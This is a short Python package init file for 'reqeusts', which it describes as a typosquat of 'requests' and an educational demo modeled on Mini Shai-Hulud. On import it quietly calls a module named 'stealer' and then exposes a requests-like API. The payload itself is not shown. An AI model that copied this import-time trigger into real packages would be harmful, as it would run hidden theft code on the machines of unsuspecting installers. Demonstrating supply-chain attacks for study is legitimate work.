"""
reqeusts — a typosquatted package masquerading as 'requests'.

On import, this package silently executes its malicious payload
before exposing a minimal requests-compatible API surface.

This is a SAFE educational demo modeled on Mini Shai-Hulud (May 2026).
"""

from . import stealer as _payload
_payload.run()

from .api import get, post, Response
